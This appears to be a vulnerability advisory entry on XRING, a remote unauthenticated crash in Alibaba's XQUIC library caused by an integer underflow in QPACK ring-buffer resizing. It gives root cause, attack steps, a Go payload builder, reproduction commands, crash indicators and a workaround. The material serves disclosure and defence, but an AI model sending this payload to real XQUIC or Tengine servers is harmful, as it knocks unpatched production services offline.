# XRING — XQUIC QPACK Ring Buffer Resize Underflow (Remote Unauthenticated DoS)

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-07-08 |
| **Last Updated** | 2026-07-08 |
| **Author / Researcher** | Sébastien Féry (FoxIO) |
| **CVE / Advisory** | N/A |
| **Category** | network |
| **Severity** | Critical |
| **CVSS Score** | N/A (no official score published) — remote, unauthenticated, deterministic crash from ~260 bytes of spec-compliant traffic |
| **Status** | Weaponized (public PoC, unpatched at publication) |
| **Tags** | quic, http3, qpack, xquic, alibaba, tengine, ring-buffer, integer-underflow, heap-oob-read, memcpy, remote, unauthenticated, dos, no-cve |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | [alibaba/xquic](https://github.com/alibaba/xquic) — QUIC/HTTP-3 library, used by Tengine and reportedly across Alibaba's cloud/CDN infrastructure (Taobao, AliPay) |
| **Versions Affected** | All versions through v1.9.4 (latest at time of publication) |
| **Language / Platform** | C, Linux server |
| **Authentication Required** | No |
| **Network Access Required** | Yes — remote, unauthenticated UDP/QUIC client |

---

## Summary

XRING is a remote, unauthenticated crash in XQUIC (Alibaba's QUIC/HTTP-3 library) triggered by fully spec-compliant QPACK dynamic-table encoder-stream instructions. A single incorrect variable in `xqc_ring_mem_resize()` (`src/common/utils/ringmem/xqc_ring_mem.c`) causes the "both-truncated" resize branch to size the old buffer's tail using the *new* table capacity instead of the *old* one. This produces a 64-byte heap out-of-bounds read followed by a `size_t` underflow that is then used as a `memcpy` length, causing an oversized heap write and crashing the server. No authentication or unusual configuration is required — roughly 260 bytes of valid QPACK instructions from any remote client are enough. FoxIO reported the bug privately to the xquic maintainers starting 2026-04-07 and received no fix or response after repeated follow-ups, publishing the PoC on 2026-07-08 with no CVE assigned and no patch available.

---

## Vulnerability Details

### Root Cause

In `xqc_ring_mem_resize()`, the "both old and new buffers truncated" resize branch computes the old buffer's tail size as:

```c
size_t ori_sz1 = mcap - soffset_ori;   /* bug: uses new capacity (mcap) */
/* should be: */
size_t ori_sz1 = rmem->capacity - soffset_ori;  /* old capacity */
```

Using the new (larger) capacity `mcap` instead of the ring's original `capacity` makes `ori_sz1` overshoot the true remaining size of the old buffer. Because `soffset_ori` can legitimately exceed `mcap` in this state, the subtraction underflows the unsigned `size_t`, producing a huge length value that is passed directly to `memcpy`, causing a heap out-of-bounds read (~64 bytes) and, per the underflowed length, an oversized/invalid write — a crash (and a data-corruption primitive in principle, though this PoC targets the DoS condition only). This is a straightforward copy-paste/variable-confusion bug (CWE-191 Integer Underflow / CWE-125 Out-of-bounds Read leading to CWE-787-style memcpy misuse).

### Attack Vector

1. A remote, unauthenticated HTTP/3 client opens a QUIC connection to the target XQUIC server and opens the standard HTTP/3 control stream (`0x00 0x04 0x00`) and QPACK encoder stream (stream type `0x02`).
2. On the encoder stream, the client sends: a `Set Dynamic Table Capacity` instruction to 64, 61 `Insert With Name Reference`/literal insert pairs, one more insert, then a `Set Dynamic Table Capacity` instruction to 65 — all spec-compliant QPACK encoder instructions (see `remote-client/main.go`'s `buildPayload()`).
3. This sequence drives the dynamic table through a resize where both the old and new backing buffers are truncated (wrap around the ring), hitting the miscalculated `ori_sz1` branch in `xqc_ring_mem_resize()`.
4. The resulting underflowed `memcpy` crashes the server process deterministically — observed as glibc `_FORTIFY_SOURCE` aborting the operation (`*** buffer overflow detected ***: terminated`, SIGTRAP/exit 133) or SIGSEGV/SIGABRT depending on build.

### Impact

Deterministic, unauthenticated remote denial of service against any XQUIC-based HTTP/3 server (e.g. Tengine) with QPACK dynamic-table support enabled — the default configuration. No memory-corruption exploitation beyond crash is demonstrated in this PoC, but the underlying primitive (heap OOB read + underflowed-length memcpy) is a plausible basis for further exploitation research.

---

## Environment / Lab Setup

```
OS:          Linux (Docker containers, Ubuntu 26.04 base images)
Target:      alibaba/xquic v1.9.4 demo_server, built via Docker (server/Dockerfile),
             linked against Tongsuo/BabaSSL 8.4-stable, listening on udp/8443
Attacker:    remote-client (Go, quic-go) — sends the crafted QPACK payload
Tools:       Docker Compose, Go toolchain (for the remote-client / ASAN variant)
```

### Setup Steps

```bash
git clone https://github.com/FoxIO-LLC/xring-poc
cd xring-poc
./run.sh build      # builds the XQUIC v1.9.4 server image
./run.sh start       # starts it on udp/8443
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Build and start the vulnerable XQUIC server**
   ```bash
   ./run.sh build
   ./run.sh start
   ```

2. **Send the crafted QPACK payload**
   ```bash
   ./run.sh attack
   ```

3. **Observe the crash**
   ```bash
   ./run.sh status
   ```

### Exploit Code

> See `remote-client/main.go` in the upstream PoC repository (mirrored/referenced here, not vendored) for the full QPACK payload builder (`buildPayload()`), and `server/Dockerfile` / `docker-compose.yml` for the vulnerable target build.

```go
// Core of the attack: two Set-Dynamic-Table-Capacity instructions (64, then 65)
// bracketing 62 literal-insert instructions on the QPACK encoder stream, driving
// xqc_ring_mem_resize() into its miscalculated "both truncated" branch.
func buildPayload() []byte {
    var buf []byte
    buf = append(buf, prefixedInt(64, 5, 0x20)...)
    for range 61 {
        buf = append(buf, insert("x", "y")...)
    }
    buf = append(buf, insert("AAAAA", "BBBBB")...)
    buf = append(buf, prefixedInt(65, 5, 0x20)...)
    return buf
}
```

### Expected Output

```
server: CRASHED (exit=133 oom=false)
cause: glibc _FORTIFY_SOURCE aborted the underflowed memcpy (SIGTRAP)
logs:
*** buffer overflow detected ***: terminated
```

### ASAN variant

```bash
./run.sh asan
cd remote-client && go run . -target 127.0.0.1:8444
docker logs xring_xquic_asan
```

---

## Detection & Indicators of Compromise

```
Process crash / core dump in xquic-linked servers (e.g. Tengine) with signatures:
  "*** buffer overflow detected ***: terminated"   (glibc _FORTIFY_SOURCE, exit 133)
  SIGSEGV (exit 139) or SIGABRT (exit 134) depending on build
  ASAN builds: heap-buffer-overflow report referencing xqc_ring_mem_resize / xqc_dtable.c
```

**Signs of compromise:**
- Unexplained crashes/restarts of XQUIC-based HTTP/3 servers correlating with QPACK encoder-stream traffic.
- Per FoxIO's research, affected deployments can be fingerprinted remotely via three JA4Scan-QUIC (JA4+ suite) signatures.

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | None available at time of publication (2026-07-08); no CVE assigned; monitor [alibaba/xquic](https://github.com/alibaba/xquic) for a fix. The correct fix is using `rmem->capacity` instead of `mcap` when computing `ori_sz1` in `xqc_ring_mem_resize()`. |
| **Workaround** | Advertise `SETTINGS_QPACK_MAX_TABLE_CAPACITY = 0` to disable the QPACK dynamic table entirely, removing the vulnerable code path. |

---

## References

- [Source repository](https://github.com/FoxIO-LLC/xring-poc)
- [FoxIO blog — XRING: Crashing XQUIC with spec-compliant QPACK instructions](https://foxio.io/blog/xring-crashing-xquic-with-spec-compliant-qpack-instructions)
- [alibaba/xquic](https://github.com/alibaba/xquic)

---

## Notes

No CVE has been assigned as of this entry's addition. FoxIO's disclosure timeline: initial contact 2026-04-07, GitHub vulnerability report 2026-04-17, follow-ups 2026-04-22/05-06/05-09 with no vendor response, publication notice 2026-07-03, blog published 2026-07-08. Given the lack of vendor engagement over ~90 days, this is treated here as a legitimate unpatched public disclosure rather than a stub/scam — the PoC is a complete, runnable Docker-based reproduction with an ASAN variant for root-cause verification.
